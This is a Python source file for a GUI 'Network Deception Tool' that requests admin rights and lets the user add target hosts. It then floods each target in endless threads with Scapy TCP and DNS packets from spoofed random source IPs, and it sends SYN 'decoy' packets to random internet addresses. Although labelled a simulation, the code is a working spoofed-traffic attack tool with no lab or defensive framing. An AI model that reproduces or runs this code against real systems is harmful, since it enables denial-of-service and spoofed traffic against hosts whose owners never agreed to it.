import os
import random
import socket
import threading
from scapy.all import sniff, IP, TCP, UDP, ICMP, DNS, DNSQR, ARP, send, Raw
import logging
import time
import ctypes
import sys
import tkinter as tk
from tkinter import scrolledtext, messagebox

# Configure logging
logging.basicConfig(filename='network_deception.log', level=logging.INFO)

# Global variables
attack_event = threading.Event()
targets = []
defense_event = threading.Event()

class DeceptionTool:
    def __init__(self):
        self.check_admin()
        self.targets = []
        self.root = None
        self.log_box = None
        self.ids_box = None
        self.is_attacking = False  # Track attack state

    def check_admin(self):
        """Check if the script is running with admin privileges."""
        if not ctypes.windll.shell32.IsUserAnAdmin():
            print("This tool requires admin privileges. Please run as administrator.")
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
            sys.exit(0)

    def log_activity(self, message, ids_alert=False):
        """Logs network activities and IDS alerts."""
        logging.info(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {message}")
        if ids_alert:
            self.ids_box.config(state=tk.NORMAL)
            self.ids_box.insert(tk.END, f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {message}\n")
            self.ids_box.config(state=tk.DISABLED)
            self.ids_box.see(tk.END)
        else:
            self.log_box.config(state=tk.NORMAL)
            self.log_box.insert(tk.END, f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {message}\n")
            self.log_box.config(state=tk.DISABLED)
            self.log_box.see(tk.END)

    def resolve_to_ip(self, target):
        """Resolve a domain name to an IP address."""
        try:
            return socket.gethostbyname(target)
        except socket.gaierror:
            self.log_activity(f"Could not resolve domain: {target}", ids_alert=True)
            return None

    def generate_fake_ip(self):
        """Generate a random spoofed IP address."""
        return f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"

    def initiate_attack(self):
        """Simulate a multi-protocol, intense attack on the target IPs or domains."""
        self.log_activity("Starting simulated data exfiltration attacks...", ids_alert=True)
        self.is_attacking = True  # Set attack state to True

        def send_packets(target_ip):
            """Send fake TCP and UDP packets to simulate data exfiltration."""
            while attack_event.is_set():
                fake_ip = self.generate_fake_ip()
                tcp_packet = IP(dst=target_ip, src=fake_ip) / TCP(dport=80, sport=random.randint(1024, 65535), flags="PA") / Raw(b"GET /sensitive_data HTTP/1.1\r\nHost: target\r\n\r\n")
                udp_packet = IP(dst=target_ip, src=fake_ip) / UDP(dport=53, sport=random.randint(1024, 65535)) / DNS(rd=1, qd=DNSQR(qname="example.com"))
                
                send(tcp_packet, verbose=False)
                send(udp_packet, verbose=False)

                self.log_activity(f"Sent TCP/UDP packets from {fake_ip} to {target_ip}")

        # Create and start a thread for each target
        for target in self.targets:
            target_ip = self.resolve_to_ip(target) if not self.is_valid_ip(target) else target
            if target_ip:
                threading.Thread(target=send_packets, args=(target_ip,), daemon=True).start()

    def is_valid_ip(self, target):
        """Check if a string is a valid IP address."""
        try:
            socket.inet_aton(target)
            return True
        except socket.error:
            return False

    def start_attack(self):
        """Start the attack by setting the attack event."""
        attack_event.set()
        self.initiate_attack()
        self.log_activity("Attack started.", ids_alert=True)  # Log attack started message

    def stop_attack(self):
        """Stop the attack by clearing the attack event."""
        attack_event.clear()
        self.is_attacking = False  # Set attack state to False
        self.log_activity("Attack stopped.", ids_alert=True)

    def add_target(self, target):
        """Add a target IP or domain to the attack scope."""
        if target not in self.targets:
            self.targets.append(target)
            self.log_activity(f"Added target: {target}", ids_alert=True)
        else:
            self.log_activity(f"Target {target} is already in scope.", ids_alert=True)

    def remove_target(self, target):
        """Remove a target IP or domain from the attack scope."""
        if target in self.targets:
            self.targets.remove(target)
            self.log_activity(f"Removed target: {target}", ids_alert=True)
        else:
            self.log_activity(f"Target {target} not found in scope.", ids_alert=True)

    def monitor_network(self, pkt):
        """Monitor network packets for potential attacks and flag suspicious activities."""
        if IP in pkt:
            src_ip = pkt[IP].src
            dst_ip = pkt[IP].dst
            proto = pkt[IP].proto
            protocol_name = self.get_protocol_name(proto)
            packet_info = self.get_packet_info(pkt)
            self.log_activity(f"Packet: {src_ip} -> {dst_ip} [Protocol: {protocol_name}] {packet_info}")

            if src_ip in self.targets:
                self.log_activity(f"Suspicious packet from target: {src_ip}", ids_alert=True)
                defense_event.set()
                self.trigger_decoy()

    def get_protocol_name(self, proto):
        """Convert protocol number to name."""
        protocols = {1: "ICMP", 6: "TCP", 17: "UDP"}
        return protocols.get(proto, "Other")

    def get_packet_info(self, pkt):
        """Return detailed information about the packet."""
        details = ""
        if TCP in pkt:
            details = f"TCP: src port {pkt[TCP].sport}, dst port {pkt[TCP].dport}"
        elif UDP in pkt:
            details = f"UDP: src port {pkt[UDP].sport}, dst port {pkt[UDP].dport}"
        elif ICMP in pkt:
            details = f"ICMP: type {pkt[ICMP].type}, code {pkt[ICMP].code}"
        return details

    def trigger_decoy(self):
        """Initiate decoy activities automatically."""
        self.log_activity("Triggering decoy mechanism...", ids_alert=True)
        for _ in range(5):
            fake_ip = self.generate_fake_ip()
            packet = IP(dst=fake_ip, src=self.generate_fake_ip()) / TCP(dport=80, flags="S")
            send(packet, verbose=False)
            self.log_activity(f"Sent decoy traffic to {fake_ip} on port 80")

    def start_network_monitoring(self):
        """Start monitoring the network for suspicious activity."""
        self.log_activity("Starting network monitoring...", ids_alert=True)
        sniff(prn=self.monitor_network, filter="ip", store=0)

    def start_gui(self):
        """Initialize the GUI for user interaction."""
        self.root = tk.Tk()
        self.root.title("Network Deception Tool")

        # IDS Alerts and Log Display areas
        self.ids_box = scrolledtext.ScrolledText(self.root, width=100, height=10, state=tk.DISABLED)
        self.ids_box.pack(padx=10, pady=(10, 0))
        self.ids_box.insert(tk.END, "IDS Alert & System Logs:\n")

        self.log_box = scrolledtext.ScrolledText(self.root, width=100, height=20, state=tk.DISABLED)
        self.log_box.pack(padx=10, pady=10)
        self.log_box.insert(tk.END, "Network Packet Logs:\n")

        # Entry for target IP or domain
        self.target_entry = tk.Entry(self.root, width=50)
        self.target_entry.pack(pady=10)

        # Buttons
        tk.Button(self.root, text="Add Target", command=self.add_target_from_entry).pack(pady=5)
        tk.Button(self.root, text="Remove Target", command=self.remove_target_from_entry).pack(pady=5)
        tk.Button(self.root, text="Start Attack", command=self.start_attack).pack(pady=5)
        tk.Button(self.root, text="Stop Attack", command=self.stop_attack).pack(pady=5)
        tk.Button(self.root, text="Exit", command=self.root.quit).pack(pady=(5, 10))

        # Start network monitoring in a separate thread
        threading.Thread(target=self.start_network_monitoring, daemon=True).start()

        self.root.mainloop()

    def add_target_from_entry(self):
        target = self.target_entry.get()
        if target:
            self.add_target(target)
            self.target_entry.delete(0, tk.END)  # Clear the input box after adding

    def remove_target_from_entry(self):
        target = self.target_entry.get()
        if target:
            self.remove_target(target)
            self.target_entry.delete(0, tk.END)  # Clear the input box after removing

if __name__ == "__main__":
    tool = DeceptionTool()
    tool.start_gui()
